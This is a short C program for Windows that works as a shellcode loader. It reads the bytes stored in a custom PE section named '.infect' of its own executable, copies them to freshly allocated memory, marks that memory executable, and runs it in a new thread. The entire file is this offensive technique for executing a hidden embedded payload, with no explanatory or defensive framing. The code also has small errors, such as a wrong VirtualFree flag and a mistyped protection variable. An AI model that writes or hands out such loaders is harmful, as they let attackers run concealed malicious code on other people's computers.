#include <Windows.h>
#include <stdio.h>

#define C_PTR( x ) ( PVOID ) x
#define U_PTR( x ) ( ULONG_PTR ) x

BOOL GetCustomizedSection(IN LPSTR  SctName, OUT OPTIONAL PVOID* SecData, OUT OPTIONAL PULONG SecSize){
	PVOID				  Image;
    PIMAGE_NT_HEADERS	  NtHeader;
    PIMAGE_SECTION_HEADER ScHeader;

	Image = GetModuleHandleA(NULL);
	
	NtHeader = (U_PTR(Image) + ((PIMAGE_DOS_HEADER)Image)->e_lfanew );
	if (NtHeader->Signature != IMAGE_NT_SIGNATURE) {
		puts( "[!] Invalid pe header" );
		return FALSE;
	}
	ScHeader = IMAGE_FIRST_SECTION(NtHeader);
	for (int i = 0; i < NtHeader->FileHeader.NumberOfSections; i++) {
		if (!ScHeader[i].VirtualAddress) {
		    continue;
		}
		if(strcmp(SctName, ScHeader[i].Name) == 0 ){
			if(SecData) {
			    *SecData = U_PTR(Image) + ScHeader[i].VirtualAddress;
			}
			if(SecSize) {
			    *SecSize = ScHeader[i].SizeOfRawData;
			}
		    return TRUE;
		}
	}
	return FALSE;
}

int main(){
	PVOID  pShellcode;
	HANDLE hThread;
	PVOID  pSctData;
	ULONG  SctSize;
	PDWORD OldProtect;
	CHAR   SctName[] = ".infect";

    if (!GetCustomizedSection( SctName, &pSctData, &SctSize ) ) {
        printf( "[!] %s Sct \"%s\" not found", SctName,SctName );
		return -1; 
    }

	printf( "[*] Config Sct found @ %p [%d bytes]\n", pSctData, SctSize );

	if(!(pShellcode = VirtualAlloc(NULL, SctSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))){
	    printf("[!] VirtualAlloc Failed: %d\n", GetLastError());
		goto CLEANUP;
	}
	printf("[*] Allocate memory for payload at 0x%p\n", pShellcode);

	memcpy(pShellcode, pSctData, SctSize);

	if(!(VirtualProtect(pShellcode, SctSize, PAGE_EXECUTE_READ, &OldProtect))){
		printf("VirtualProtect Failed: %d\n", GetLastError());
	}

	if (!(hThread = CreateThread(NULL, 0, pShellcode, NULL, 0, NULL))){
		printf("[!] CreatehThread Failed: %d\n", GetLastError());
	    goto CLEANUP;
	}

	WaitForSingleObject(hThread, INFINITE);

CLEANUP:
	if(hThread){
	    CloseHandle(hThread);
	    hThread = NULL;    
	}
	if(pShellcode){
	    VirtualFree(pShellcode, 0, MEM_FREE);
		pShellcode = NULL;
	}
	return 0;
}